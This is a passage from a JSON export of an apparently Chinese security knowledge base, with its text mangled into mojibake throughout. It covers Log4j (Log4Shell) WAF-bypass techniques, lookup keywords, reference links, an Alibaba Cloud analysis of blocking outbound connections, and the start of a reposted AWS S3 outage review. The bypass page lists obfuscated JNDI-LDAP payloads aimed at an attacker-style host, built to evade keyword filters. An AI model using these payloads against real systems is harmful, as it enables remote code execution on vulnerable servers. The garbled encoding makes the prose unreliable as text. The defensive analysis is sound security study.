å·¥å•ç³»ç»Ÿï¼šè®°å½•å¯ç–‘çš„å‘Šè­¦ï¼Œç”±äººè¿›è¡Œåˆ†ç±»è·Ÿè¿›ï¼ˆè¯¯æŠ¥å¯åœ¨ä»¥åè¿›è¡Œå®¡æŸ¥ï¼Œå¦‚å¯¹å¨èƒæƒ…æŠ¥è¿›è¡Œå›æº¯ï¼‰ã€‚\r\n      - æŒç»­æ”¹è¿›ï¼š\r\n        - æ£€æµ‹å·¥ç¨‹å°±æ˜¯è½¯ä»¶å·¥ç¨‹ï¼Œä¼šä½¿ç”¨å•å…ƒæµ‹è¯•/é›†æˆæµ‹è¯•ã€‚\r\n        - çº¢è“å¯¹æŠ—æ¥éªŒè¯ï¼Œé™¤äº†è‡ªå·±çš„çº¢é˜Ÿï¼Œä¹Ÿä¼šä½¿ç”¨ç¬¬ä¸‰æ–¹å®‰å…¨å…¬å¸ï¼ˆå¼•å…¥å¤–éƒ¨çŸ¥è¯†ï¼Œæ¶ˆé™¤å†…éƒ¨çº¢é˜Ÿå·²çŸ¥çš„å„ç§ä¿¡æ¯ï¼‰ã€‚\r\n        - äº‹ä»¶é©±åŠ¨ï¼Œæåˆ°äº†[æå…‰è¡ŒåŠ¨](https://en.wikipedia.org/wiki/Operation_Aurora)ã€‚\r\n    - **æŠ€æœ¯**\r\n      - åŸºç¡€èƒ½åŠ›çš„å»ºè®¾ï¼šè¶³å¤Ÿå…¨çš„æ•°æ®æº/æ—¥å¿—ï¼ˆå…¨é‡æ—¥å¿—å¯ä»¥å­˜å¥½å‡ ä¸ªæœˆï¼‰ã€‚\r\n      - å¨èƒå»ºæ¨¡ï¼š\r\n        - é’ˆå¯¹ä¸šåŠ¡ï¼šä¸äº§å“æˆ–é¡¹ç›®çš„è´Ÿè´£äººè¿›è¡Œå®é™…äº¤è°ˆï¼Œå¹¶ä¸ä»–ä»¬ä¸€èµ·è¿›è¡Œå¨èƒå»ºæ¨¡ã€‚\r\n        - é’ˆå¯¹é€šç”¨æŠ€æœ¯ï¼šå¦‚ä½¿ç”¨restul APIï¼Œå¯ä»¥ä½¿ç”¨ç°æˆçš„å¨èƒå»ºæ¨¡ã€‚"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/ä¸“é¢˜ç ”ç©¶/log4j/log4j WAFç»•è¿‡æ–¹å¼/","title":"log4j WAFç»•è¿‡æ–¹å¼"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: log4j WAFç»•è¿‡æ–¹å¼\r\ntags:\r\n- ä¸“é¢˜ç ”ç©¶\r\n- log4j\r\n---\r\n\r\n# ç³»ç»Ÿç¯å¢ƒå˜é‡\r\n\r\n```\r\n${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}\r\n```\r\n\r\næ¥è‡ª Apache Log4j 2 æ–‡æ¡£ï¼š${env:ENV_NAME:-default_value}\r\n\r\nå¦‚æœæ²¡æœ‰ ENV_NAME ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œåˆ™ä½¿ç”¨ :- åé¢çš„å˜é‡ï¼›æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä»»ä½•åç§°ä»£æ›¿ ENV_NAMEï¼Œä½†å®ƒå¿…é¡»æ˜¯ä¸å­˜åœ¨çš„ç¯å¢ƒå˜é‡ã€‚\r\n\r\n# Lookupæ–¹æ³•ï¼šLower / Upper\r\n\r\n```\r\n  ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}\r\n  ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}\r\n```\r\n\r\n- Lower Lookup ä¼šå°†ä¼ å…¥çš„å‚æ•°è½¬æ¢ä¸ºå°å†™ï¼ŒåµŒå¥—å½¢å¼å¦‚ä¸‹ï¼š\r\n  - ${lower:}\r\n- Upper Lookup ä¼šå°†ä¼ å…¥çš„å‚æ•°è½¬æ¢ä¸ºå¤§å†™ï¼ŒåµŒå¥—å½¢å¼å¦‚ä¸‹ï¼š\r\n  - ${upper:}\r\n\r\n# \"::-\" ç¬¦å·\r\n\r\n```\r\n  ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}\r\n```\r\n\r\nåŒç³»ç»Ÿç¯å¢ƒå˜é‡éƒ¨åˆ†ã€‚\r\n\r\n# \":-\" ç¬¦å·\r\n\r\n```\r\n  ${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}\r\n```\r\n\r\n# æ— æ•ˆçš„Unicodeå­—ç¬¦\r\n\r\n```\r\n  ${jnd${upper:Ä±}:ldap://somesitehackerofhell.com/z}\r\n```\r\n\r\nè¿™é‡Œçš„ **Ä±(\\u0131)** ä¸æ˜¯ **i(\\x69)å’ŒI(\\x49)**ï¼Œç»è¿‡ upper å°±ä¼šè½¬å˜æˆ Iï¼Œä»è€Œç»•è¿‡äº† jndi å…³é”®è¯çš„æ‹¦æˆªã€‚\r\n\r\n# HTMLç¼–ç \r\n\r\n```\r\n  } with %7D\r\n  { with %7B\r\n  $ with %24\r\n```\r\n\r\n# unicode / hex ç¼–ç ç‰¹æ€§\r\n\r\nè™½ç„¶è¿™ä¸ªèŒƒå›´æœ‰ç‚¹å¤§å¯èƒ½ä¼šäº§ç”Ÿä¸€äº›è¯¯æŠ¥ï¼Œä½†é‰´äºæ¼æ´çš„ä¸¥é‡æ€§è¿˜æ˜¯æœ‰å¾ˆå¤šäººå»ºè®®æ‹¦æˆª ${ ä½†è¿™æ ·ä¹Ÿæœªå¿…èƒ½å¤ŸçœŸæ­£çš„è§£å†³ï¼Œå› ä¸ºæ¼æ´çš„è§¦å‘ç‚¹æ˜¯åœ¨æ‰“å°æ—¥å¿—çš„æ—¶å€™æŠŠå¯æ§å†…å®¹æºå¸¦è¿›å»äº†ã€‚ç°åœ¨éšç€ JSON æ•°æ®æ ¼å¼çš„æµè¡Œï¼Œå¾ˆå¤šç³»ç»Ÿéƒ½åœ¨ä½¿ç”¨ JSON å¤„ç†å‚æ•°ï¼ŒJSON å¤„ç†åº“ç”¨çš„æœ€å¤šçš„å°±æ•° Jacksonå’Œfastjsonã€‚è€Œ Jackson å’Œ fastjson åˆæœ‰ unicode å’Œ hex çš„ç¼–ç ç‰¹æ€§ï¼Œå¦‚ï¼š\r\n\r\n```\r\n  {\"key\":\"\\u0024\\u007b\"}\r\n  {\"key\":\"\\x24\\u007b\"}\r\n```\r\n\r\nè¿™æ ·å°±é¿å¼€äº†æ•°æ®åŒ…ä¸­æœ‰ ${ çš„æ¡ä»¶ã€‚\r\n\r\n# å‚è€ƒèµ„æ–™\r\n\r\n- [https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg](https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg)\r\n- [https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words)\r\n- [https://github.com/woodpecker-appstore/log4j-payload-generator](https://github.com/woodpecker-appstore/log4j-payload-generator)\r\n- [https://canarytokens.org/generate](https://canarytokens.org/generate)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/ä¸“é¢˜ç ”ç©¶/log4j/log4j å¯åˆ©ç”¨çš„keywords/","title":"log4j å¯åˆ©ç”¨çš„keywords"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: log4j å¯åˆ©ç”¨çš„keywords\r\ntags:\r\n- ä¸“é¢˜ç ”ç©¶\r\n- log4j\r\n---\r\n\r\n\r\n\r\n# åˆ©ç”¨**keywords**\r\n\r\n```\r\n  ${ctx:loginId}\r\n  ${map:type}\r\n  ${filename}\r\n  ${date:MM-dd-yyyy}\r\n  ${docker:containerId}\r\n  ${docker:containerName}\r\n  ${docker:imageName}\r\n  ${env:USER}\r\n  ${event:Marker}\r\n  ${mdc:UserId}\r\n  ${java:runtime}\r\n  ${java:vm}\r\n  ${java:os}\r\n  ${jndi:logging/context-name}\r\n  ${hostName}\r\n  ${docker:containerId}\r\n  ${k8s:accountName}\r\n  ${k8s:clusterName}\r\n  ${k8s:containerId}\r\n  ${k8s:containerName}\r\n  ${k8s:host}\r\n  ${k8s:labels.app}\r\n  ${k8s:labels.podTemplateHash}\r\n  ${k8s:masterUrl}\r\n  ${k8s:namespaceId}\r\n  ${k8s:namespaceName}\r\n  ${k8s:podId}\r\n  ${k8s:podIp}\r\n  ${k8s:podName}\r\n  ${k8s:imageId}\r\n  ${k8s:imageName}\r\n  ${log4j:configLocation}\r\n  ${log4j:configParentLocation}\r\n  ${spring:spring.application.name}\r\n  ${main:myString}\r\n  ${main:0}\r\n  ${main:1}\r\n  ${main:2}\r\n  ${main:3}\r\n  ${main:4}\r\n  ${main:bar}\r\n  ${name}\r\n  ${marker}\r\n  ${marker:name}\r\n  ${spring:profiles.active[0]}\r\n  ${sys:logPath}\r\n  ${web:rootDir}\r\n```"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/ä¸“é¢˜ç ”ç©¶/log4j/log4j æ€ç»´å¯¼å›¾/","title":"log4j å¯åˆ©ç”¨çš„keywords"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: log4j å¯åˆ©ç”¨çš„keywords\r\ntags:\r\n- ä¸“é¢˜ç ”ç©¶\r\n- log4j\r\n- æ€ç»´å¯¼å›¾\r\n---\r\n\r\n# Mind map # 1 : Am I vulnerable to Log4shell?\r\n\r\n![bMjLAO](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/bMjLAO.jpg)\r\n\r\n# Mind map # 2 : How to detect the vulnerability, from the black box or white box perspective\r\n\r\n![GqijHu](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/GqijHu.jpg)\r\n\r\n# Mind map # 3 : Shielding & mitigations against Log4shell : Patching is one thing, but defence in depth is advised. A few pointers in this mind map can help\r\n\r\n![4QFFTG](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/4QFFTG.jpg)\r\n\r\n# Mind map # 4 : log4j Response Flow\r\n\r\n![clhNCI](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/clhNCI.jpg)\r\n\r\n# æ¥æº\r\n\r\n- [https://github.com/DickReverse/InfosecMindmaps](https://github.com/DickReverse/InfosecMindmaps)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/ä¸“é¢˜ç ”ç©¶/log4j/log4j ç›¸å…³tricks&links/","title":"log4j ç›¸å…³tricks&links"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: log4j ç›¸å…³tricks&links\r\ntags:\r\n- ä¸“é¢˜ç ”ç©¶\r\n- log4j\r\n---\r\n\r\n# åœ¨apacheç½‘ç«™è®¨è®ºç»†èŠ‚çš„2ä¸ªJiraé“¾æ¥\r\n\r\n- [https://issues.apache.org/jira/browse/LOG4J2-3201](https://issues.apache.org/jira/browse/LOG4J2-3201)\r\n- [https://issues.apache.org/jira/browse/LOG4J2-3198](https://issues.apache.org/jira/browse/LOG4J2-3198)\r\n\r\n# log4jè§£å†³æ­¤é—®é¢˜çš„PRå…¬å‘Š\r\n\r\n- [https://github.com/apache/logging-log4j2/pull/607](https://github.com/apache/logging-log4j2/pull/607)\r\n\r\n# log4jç›¸å…³å…³è”ç»„ä»¶\r\n\r\n- [https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages)\r\n\r\n# é¶åœºæµ‹è¯•ç¯å¢ƒæ­å»º\r\n\r\n- [https://github.com/leonjza/log4jpwn](https://github.com/leonjza/log4jpwn)\r\n\r\n# Suricataæ£€æµ‹è§„åˆ™\r\n\r\n- 2034647\r\n- 2034648\r\n- 2034648\r\n- 2034649\r\n- 2034650\r\n- 2034651\r\n- 2034652\r\n- [https://rules.emergingthreatspro.com/open/](https://rules.emergingthreatspro.com/open/)\r\n\r\n# log4jæ”»å‡»é¢\r\n\r\n- [https://github.com/YfryTchsGD/Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/ä¸“é¢˜ç ”ç©¶/log4j/é˜¿é‡Œäº‘å®‰å…¨çš„log4jåˆ†ææ–‡ç« å†™çš„å¾ˆæ£’/","title":"é˜¿é‡Œäº‘å®‰å…¨çš„log4jåˆ†ææ–‡ç« å†™çš„å¾ˆæ£’"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: é˜¿é‡Œäº‘å®‰å…¨çš„log4jåˆ†ææ–‡ç« å†™çš„å¾ˆæ£’\r\ntags:\r\n- ä¸“é¢˜ç ”ç©¶\r\n- log4j\r\n- é˜¿é‡Œäº‘\r\n---\r\n\r\n# è­¦æƒ•ä¸»åŠ¨å¤–è”ï¼äº‘é˜²ç«å¢™æ£€æµ‹æ‹¦æˆªå‹’ç´¢ã€Muhstikåƒµå°¸ç½‘ç»œç­‰ Log4j2æ¼æ´åˆ©ç”¨\r\n\r\nä¸»åŠ¨å¤–è”æ‹¦æˆªè¶…9800+èµ·ï¼Œæœ‰æ•ˆéåˆ¶è •è™«ä¼ æ’­\r\n\r\n- é˜¿é‡Œäº‘å®‰å…¨å›¢é˜Ÿåˆ†æäº† Apache Log4j2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¸¸è§çš„éªŒè¯ã€åˆ©ç”¨æ–¹å¼åŠå…¶åŸç†ï¼Œå‘ç°æ”»å‡»è€…åœ¨è¯•å›¾åˆ©ç”¨è¯¥æ¼æ´å‘èµ·æ¶æ„è¡Œä¸ºè¿‡ç¨‹ä¸­ï¼Œ**å‡å­˜åœ¨å¤šæ¬¡å¿…è¦çš„æœåŠ¡å™¨å¤–è”é€šä¿¡ï¼š**\r\n  - åœ¨æ”»å‡»è€…å‘é€è¯·æ±‚ä¹‹åï¼Œå‘½ä»¤æ‰§è¡Œé˜¶æ®µä¹‹å‰ï¼Œå—å®³æœåŠ¡å™¨éœ€è¦å‘æ”»å‡»è€…æ‰€æ§åˆ¶çš„å¸¦æ¶æ„è½½è·çš„LDAP/RMIæœåŠ¡å™¨å‘èµ·è‡³å°‘ä¸¤æ¬¡è¯·æ±‚ï¼ˆè¯·æ±‚Referenceã€åŠ è½½classï¼‰ï¼›\r\n  - å‘½ä»¤æ‰§è¡Œé˜¶æ®µå½“ä¸­ï¼Œå¦‚æœåè¿ã€åå¼¹shellã€åé—¨æ¤å…¥ç­‰ï¼Œåˆ™éœ€è¦å‘DNSåè¿å¹³å°ã€é»‘å®¢æ§åˆ¶çš„æœåŠ¡å™¨ç­‰å‘èµ·å¤–è”ã€‚\r\n- é€šè¿‡ä¸»åŠ¨å¤–è”ç®¡æ§ï¼Œå¯ä»¥æœ‰æ•ˆæ–©æ–­è¯¥æ¼æ´çš„éªŒè¯å’Œåˆ©ç”¨é“¾ï¼Œæœ‰æ•ˆéåˆ¶æ¶æ„è •è™«å’Œé«˜çº§å¨èƒä¼ æ’­ã€‚\r\n- æˆªè‡³ç›®å‰ï¼Œé˜¿é‡Œäº‘äº‘é˜²ç«å¢™å·²æ£€æµ‹å¹¶é˜»æ–­ä¸»åŠ¨å¤–è”çš„Log4jæ¶æ„åˆ©ç”¨9800+èµ·ï¼Œæ¶‰åŠåƒµå°¸ç½‘ç»œå®¶æ—ã€å›¢ä¼™åä½™ä¸ªï¼ŒåŒ…æ‹¬Tellyouthepassç­‰å‹’ç´¢å›¢ä¼™ï¼ŒKinsingã€Muhstikã€Miraiç­‰æŒ–çŸ¿å’ŒDDOSå®¶æ—ç­‰ã€‚\r\n\r\nLog4jæ¼æ´åŸç†â€”â€”ä¸ºä»€ä¹ˆè¦ç®¡æ§ä¸»åŠ¨å¤–è”ï¼Ÿ\r\n\r\n- Log4jæ¼æ´çš„æœ¬è´¨æ˜¯ä¸€ä¸ªJNDIæ³¨å…¥æ¼æ´ã€‚JNDIæ˜¯Javaçš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚\r\n- JNDIæ”¯æŒLDAPã€DNSã€NISã€RMIã€CORBAç­‰å¤šç§åè®®ï¼Œå³ä½¿å¹¶ééƒ½èƒ½ç”¨äºå‘½ä»¤æ‰§è¡Œï¼Œä½†ä¿¡æ¯å¯ä»¥é€šè¿‡ä¸Šè¿°å‡ ç§åè®®ä¸­ä»»ä½•ä¸€ç§è¢«æ³„éœ²ï¼ŒåŠ ä¹‹è¯¥æ¼æ´ç›¸å…³æºç å­˜åœ¨é€’å½’è§£æï¼Œåˆ©ç”¨æ–¹å¼éå¸¸çµæ´»ï¼Œpayloadå˜åŒ–å¤šç«¯ä¸”æ¼æ´å…¥å£å¤šæ ·åŒ–ï¼Œç›®å‰è¡Œä¸šä¸­å¯¹è¯¥æ¼æ´çš„é˜²æŠ¤ç¼ºä¹å®Œæ•´çš„ä½“ç³»åŒ–æ€è·¯ã€‚\r\n\r\n**æ¼æ´åˆ©ç”¨çµæ´» é˜²æŠ¤æ£è‚˜**\r\n\r\n- æ¼æ´å…¥å£å¤šæ ·åŒ–ï¼š\r\n  - webæœåŠ¡æ˜¯Log4jæ¼æ´åˆ©ç”¨çš„é‡è¦å…¥å£ï¼Œä½†ç»ä¸æ˜¯å”¯ä¸€å…¥å£ï¼Œåªè¦ä»»æ„è¾“å…¥ç‰‡æ®µåˆ°è¾¾åº”ç”¨ç¨‹åºå¹¶é€šè¿‡Log4j2è¿›è¡Œå¤„ç†ï¼Œå°±å¯èƒ½è§¦å‘è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚å¦‚æœåœ¨é˜²å¾¡æ—¶åªåšå…¥æ–¹å‘Webä¾§é˜²æŠ¤ï¼Œå¾ˆéš¾å½»åº•é˜²å¾¡è¿™ä¸€æ”»å‡»ï¼›\r\n- Payloadå˜å½¢å¤šï¼š\r\n  - çµæ´»çš„åˆ©ç”¨æ–¹å¼å¯¼è‡´æµé‡æ£€æµ‹/æ‹¦æˆªç­‰æ­£é¢å¯¹æŠ—æ‰‹æ®µå­˜åœ¨è¾ƒå¤§çš„è¢«ç»•è¿‡å¯èƒ½æ€§ã€‚æ”»å‡»payloadå¹¶éä¸€å®šé€šè¿‡æ˜æ–‡æ–¹å¼åˆ°è¾¾Log4j2ç»„ä»¶å¤„ç†ï¼Œä¸­é—´å¤„ç†é˜¶æ®µå¯èƒ½é€šè¿‡ç¼–ç ã€åŠ å¯†ç­‰å„ä¸ªé˜¶æ®µï¼Œå•å­—æ®µæ‹¦æˆªå¯èƒ½é€ æˆå¤§é‡è¯¯æŠ¥ï¼›\r\n- å¤šç§åè®®å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼š\r\n  - ä»…é’ˆå¯¹LDAPã€RMIå‰ç¼€è¿›è¡Œæ£€æµ‹å’Œæ‹¦æˆªå¾ˆéš¾é˜²å¾¡ä¿¡æ¯æ³„éœ²ã€æœ¨é©¬åé—¨ç­‰çš„å½±å“ã€‚\r\n- æœåŠ¡å™¨å¤–è”ç®¡æ§ æ–©æ–­æ¼æ´åˆ©ç”¨é“¾æ¡\r\n  - æ”»å‡»è€…åˆ©ç”¨Log4j RCEæ¼æ´è¿›è¡Œè¿œç¨‹æ¶æ„è¡Œä¸ºçš„æ­¥éª¤å¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\r\n  - ![lzzcDi](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/lzzcDi.jpg)\r\n- æ”»å‡»è€…éƒ¨ç½²å¸¦æœ‰æ¶æ„è½½è·çš„LADP/RMIæœåŠ¡å™¨\r\n- å‘ä½¿ç”¨Log4j2ç»„ä»¶çš„æœåŠ¡å™¨å‘é€å¸¦æœ‰æ¶æ„çš„JNDI payloadçš„æ”»å‡»è¯·æ±‚\r\n- å—æ”»å‡»æœåŠ¡å™¨ä¸­çš„ä½¿ç”¨Log4j2ç»„ä»¶çš„æœåŠ¡è°ƒç”¨lookupæ–¹æ³•ï¼Œå‘æ¶æ„LADP/RMIæœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œå¹¶ä»å“åº”ä¸­è·å–è¿”å›çš„æ¶æ„Referenceå¯¹è±¡\r\n- æœåŠ¡å™¨è§£æè¯¥æ¶æ„Referenceå¯¹è±¡ï¼Œå¹¶è¿›ä¸€æ­¥åŸºäºReferenceä¸­æŒ‡å®šçš„codebaseåœ°å€ï¼ŒåŠ è½½å¹¶æ‰§è¡Œæ¶æ„class\r\n- å®ç°å‘½ä»¤æ‰§è¡Œåï¼Œæ”»å‡»è€…å°†å¾—ä»¥æ“æ§å—å®³æœåŠ¡å™¨å»è¿›è¡Œå„ç§æ“ä½œï¼ŒåŒ…æ‹¬ä½†ä¸é™äºåè¿éªŒè¯ã€å¤–å¸¦æ•æ„Ÿä¿¡æ¯ã€åå¼¹shellã€åé—¨æ¤å…¥ç­‰\r\n\r\n- å› ä¸ºè¯¥æ¼æ´æœ¬è´¨æ˜¯JNDIæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…è¦æ‰§è¡Œä»»æ„ä»£ç ï¼Œå—å®³ä¸»æœºå¿…é¡»è¿›è¡Œè‡³å°‘ä¸¤æ¬¡ä¸»åŠ¨å¤–è”ï¼šç¬¬ä¸€æ¬¡æ˜¯è¯·æ±‚Referenceå¯¹è±¡ï¼Œç¬¬äºŒæ¬¡æ˜¯åŠ è½½æ¶æ„classã€‚\r\n- ç†è®ºä¸Šæ¥è¯´ï¼Œç®¡æ§å¥½æœåŠ¡å™¨çš„ä¸»åŠ¨å¤–è”è¡Œä¸ºï¼Œä»…æ”¾è¡Œè®¤è¯†çš„åŸŸå/IPå’Œåè®®ï¼Œè®©å®ƒæ— æ³•å‘é™Œç”Ÿçš„ã€æ”»å‡»è€…æ§åˆ¶çš„åŸŸå/IPå‘è¯·æ±‚ï¼Œæ¼æ´å°±æ— æ³•åˆ©ç”¨æˆåŠŸäº†ã€‚\r\n- **è¿™æ˜¯ç›®å‰æ¥çœ‹æœ€éš¾è¢«ç»•è¿‡çš„é˜²å¾¡æ–¹å¼ä¹‹ä¸€ã€‚**\r\n\r\n# æ¥æº\r\n\r\n- [https://mp.weixin.qq.com/s/zFPCuXSlQKH2gI_jAQ5IxA](https://mp.weixin.qq.com/s/zFPCuXSlQKH2gI_jAQ5IxA)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/è¡Œä¸šè§‚å¯Ÿ/AWS/AWS çš„ S3 æ•…éšœå›é¡¾å’Œæ€è€ƒ/","title":"AWS çš„ S3 æ•…éšœå›é¡¾å’Œæ€è€ƒ"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: AWS çš„ S3 æ•…éšœå›é¡¾å’Œæ€è€ƒ\r\ntags:\r\n- è¡Œä¸šè§‚å¯Ÿ\r\n- AWS\r\n---\r\n\r\nè½¬è½½è‡ªï¼š[https://coolshell.cn/articles/17737.html](https://coolshell.cn/articles/17737.html)\r\n\r\nç»§[Gitlabçš„è¯¯åˆ é™¤æ•°æ®äº‹ä»¶](https://coolshell.cn/articles/17680.html)æ²¡å‡ å¤©ï¼Œâ€œä¸æ²‰èˆªæ¯â€ AWS S3 ï¼ˆSimple Storage Serviceï¼‰å‡ å¤©å‰ä¹Ÿâ€œæ²‰â€äº†4ä¸ªå°æ—¶ï¼Œå¢™å¤–çš„åŠä¸ªäº’è”ç½‘ä¹Ÿè·Ÿç€æŒ‚äº†ã€‚å¦‚çº¦ï¼ŒæŒ‰ AWS æƒ¯ä¾‹ï¼ŒAWSä»Šå¤©ç»™å‡ºäº†ä¸€ä¸ªç®€å•çš„æ•…éšœæŠ¥å‘Š[ã€ŠSummary of the Amazon S3 Service Disruption in the Northern Virginia (US-EAST-1) Regionã€‹](https://aws.amazon.com/cn/message/41926/)ã€‚è¿™ä¸ªæ•…éšœå’Œç®€å•æ¥è¯´å’ŒGitlabä¸€æ ·ï¼Œä¹Ÿæ˜¯äººå‘˜è¯¯æ“ä½œã€‚å…ˆç®€å•çš„è¯´ä¸€ä¸‹è¿™ä»½æŠ¥ä¸­è¯´äº†ä»€ä¹ˆã€‚\r\n\r\n# æ•…éšœåŸå› \r\n\r\nç®€å•æ¥è¯´ï¼Œè¿™å¤©ï¼Œæœ‰ä¸€ä¸ª AWS å·¥ç¨‹å¸ˆåœ¨è°ƒæŸ¥ Northern Virginia (US-EAST-1) Region ä¸Š S3 çš„ä¸€ä¸ªå’Œè´¦åŠ¡ç³»ç»Ÿç›¸å…³çš„é—®é¢˜ï¼Œè¿™ä¸ªé—®é¢˜æ˜¯S3çš„è´¦åŠ¡ç³»ç»Ÿå˜æ…¢äº†ï¼ˆæˆ‘ä¼°è®¡è¿™ä¸ªæ•…éšœåœ¨Amazoné‡Œå¯èƒ½æ˜¯Sev2çº§ï¼ŒSev2çº§çš„æ•…éšœåœ¨Amazonç®—æ˜¯æ¯”è¾ƒå¤§çš„æ•…éšœï¼Œéœ€è¦å¾ˆå¿«è§£å†³ï¼‰ï¼ŒOncallçš„å¼€å‘å·¥ç¨‹å¸ˆï¼ˆæ³¨ï¼šAmazonçš„è¿ç»´éƒ½æ˜¯ç”±å¼€å‘å·¥ç¨‹å¸ˆæ¥å¹²çš„ï¼Œæ‰€ä»¥Amazonå†…éƒ¨å¬‰ç§°SDE-Software Developer Engineer ä¸º Someone Do Everythingï¼‰æƒ³ç§»é™¤ä¸€ä¸ªè´¦åŠ¡ç³»ç»Ÿé‡Œçš„ä¸€ä¸ªå­ç³»ç»Ÿä¸‹çš„ä¸€äº›å°‘é‡çš„æœåŠ¡å™¨ï¼ˆä¼°è®¡è¿™äº›æœåŠ¡å™¨ä¸Šæœ‰é—®é¢˜ï¼Œæ‰€ä»¥æƒ³ç§»æ‰åé‡æ–°éƒ¨ç½²ï¼‰ï¼Œç»“æœå‘¢ï¼Œæœ‰ä¸€æ¡å‘½ä»¤æé”™äº†ï¼Œå¯¼è‡´äº†ç§»é™¤äº†å¤§é‡çš„S3çš„æ§åˆ¶ç³»ç»Ÿã€‚åŒ…æ‹¬ä¸¤ä¸ªå¾ˆé‡è¦çš„å­ç³»ç»Ÿï¼š\r\n\r\n1. ä¸€ä¸ªæ˜¯S3çš„å¯¹è±¡ç´¢å¼•æœåŠ¡ï¼ˆIndexï¼‰**ï¼Œå…¶ä¸­å­˜å‚¨äº†S3å¯¹è±¡çš„metadataå’Œä½ç½®ä¿¡æ¯ã€‚è¿™ä¸ªæœåŠ¡ä¹Ÿæä¾›äº†æ‰€æœ‰çš„ GETï¼ŒLISTï¼ŒPUT å’ŒDELETEè¯·æ±‚ã€‚\r\n\r\n2. ä¸€ä¸ªæ˜¯S3çš„ä½ç½®æœåŠ¡ç³»ç»Ÿï¼ˆPlacementï¼‰**ï¼Œè¿™ä¸ªæœåŠ¡æä¾›å¯¹è±¡çš„å­˜å‚¨ä½ç½®å’Œç´¢å¼•æœåŠ¡çš„ç³»ç»Ÿã€‚è¿™ä¸ªç³»ç»Ÿä¸»è¦æ˜¯ç”¨äºå¤„ç†PUTæ–°å¯¹è±¡è¯·æ±‚ã€‚\r\n\r\nè¿™å°±æ˜¯ä¸ºä»€ä¹ˆS3ä¸å¯è®¿é—®çš„åŸå› ã€‚\r\n\r\nåœ¨åé¢ï¼ŒAWSä¹Ÿè¯´æ˜äº†ä¸€ä¸‹æ•…éšœæ¢å¤çš„è¿‡ç¨‹ï¼Œå…¶ä¸­é‡ç‚¹æåˆ°äº†è¿™ç‚¹â€”â€”\r\n\r\nè™½ç„¶æ•´ä¸ªS3çš„æ˜¯åšè¿‡å……åˆ†çš„æ•…éšœè®¾è®¡çš„ï¼ˆæ³¨ï¼šAWSçš„ä¸ƒå¤§Design Principle ä¹‹ä¸€ Design for Failureï¼‰â€”â€” å°±ç®—æ˜¯æœ€æ ¸å¿ƒçš„ç»„ä»¶æˆ–æœåŠ¡å‡ºé—®é¢˜äº†ï¼Œç³»ç»Ÿä¹Ÿèƒ½æ¢å¤ã€‚ä½†æ˜¯ï¼Œå¯èƒ½æ˜¯åœ¨è¿‡å»çš„æ—¥å­é‡Œ S3 å¤ªç¨³å®šäº†ï¼Œæ‰€ä»¥ï¼ŒAWS åœ¨å¾ˆé•¿å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…éƒ½æ²¡æœ‰é‡å¯è¿‡ S3 çš„æ ¸å¿ƒæœåŠ¡ï¼Œè€Œè¿‡å»è¿™å‡ å¹´ï¼ŒS3 çš„æ•°æ®å¯¹è±¡å­˜å‚¨çº§æ•°çº§çš„æˆé•¿ï¼ˆS3å­˜äº†ä»€ä¹ˆæ ·æ•°é‡çº§çš„å¯¹è±¡ï¼Œå› 